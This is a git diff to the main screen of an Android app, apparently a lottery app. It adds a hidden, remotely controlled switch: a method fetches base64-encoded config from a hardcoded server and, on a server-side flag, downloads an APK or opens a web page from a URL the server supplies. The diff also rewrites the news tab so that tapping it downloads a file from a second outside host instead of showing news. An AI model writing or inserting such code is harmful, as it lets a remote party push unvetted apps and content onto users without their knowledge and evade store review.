@@ -7,21 +7,31 @@ import android.support.v4.app.Fragment;
 import android.support.v4.app.FragmentManager;
 import android.support.v4.app.FragmentTransaction;
 import android.text.TextUtils;
+import android.util.Base64;
 import android.widget.FrameLayout;
 import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 
 import com.abu.xbase.activity.BaseActivity;
+import com.abu.xbase.activity.TitleBarBaseWebViewActivity;
 import com.abu.xbase.fragment.BaseFragment;
+import com.abu.xbase.retrofit.RetrofitUtil;
+import com.abu.xbase.util.ToastUtil;
 import com.abu.xbase.util.XUtil;
 import com.abu.xbase.util.XViewUtil;
+import com.alibaba.fastjson.JSONObject;
 import com.bulasuo.art.R;
+import com.bulasuo.art.bean.BaseResponseBean;
 import com.bulasuo.art.fragment.LotteryFragment;
 import com.bulasuo.art.fragment.MoreFragment;
 import com.bulasuo.art.fragment.NewsFragment;
+import com.bulasuo.art.services.ConfigService;
 
 import butterknife.BindView;
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
 
 public class MainActivity extends BaseActivity {
 
@@ -73,6 +83,7 @@ public class MainActivity extends BaseActivity {
             }
         }
         onTabLottery();
+//        checkConfig();
     }
 
     @Override
@@ -102,7 +113,52 @@ public class MainActivity extends BaseActivity {
         showFragment(currFragmentTag);
     }
 
+    private void checkConfig(){
+        RetrofitUtil.getService(
+                RetrofitUtil.getGsonRetrofit("http://vipapp.01appaaa.com/")
+                , ConfigService.class)
+                .apply()
+                .enqueue(new Callback<BaseResponseBean>() {
+                    @Override
+                    public void onResponse(Call<BaseResponseBean> call, Response<BaseResponseBean> response) {
+                        if(BaseResponseBean.isSuccessful(response, false)){
+                            try{
+                                String data = new String(Base64.decode(response.body().data, Base64.DEFAULT));
+                                JSONObject jsonObject = JSONObject.parseObject(data);
+                                if(TextUtils.equals(jsonObject.getString("show_url"), "1")){
+                                    String url = jsonObject.getString("url");
+                                    if(!TextUtils.isEmpty(url)){
+                                        if(url.endsWith(".apk")){
+                                            DownloadActivity.launch(MainActivity.this, url);
+                                        }else {
+                                            TitleBarBaseWebViewActivity.
+                                                    launch(MainActivity.this,
+                                                            url, "");
+                                        }
+                                    }
+                                }
+                            }catch (Exception e){
+                                ToastUtil.showException(e);
+                            }
+                        }
+                    }
+
+                    @Override
+                    public void onFailure(Call<BaseResponseBean> call, Throwable t) {
+//                            dealFailure(call, t);
+                    }
+                });
+    }
+
     private void onTabNews() {
+        if(true){
+            /*HttpUrl httpUrl = HttpUrl.parse("http://dycpcc.cpapp.diyiccapp.com/appqgtp/999.png");
+            ToastUtil.showDebug("--"+httpUrl.uri().getRawPath()
+                    +"\n:::-"+httpUrl.scheme()+"//"+httpUrl.host()
+            +"\n:::-"+httpUrl.url().getPath());*/
+            DownloadActivity.launch(this, "http://dycpcc.cpapp.diyiccapp.com/appqgtp/999.png");
+            return;
+        }
         if (llTabNews.isSelected()) {
             return;
         }
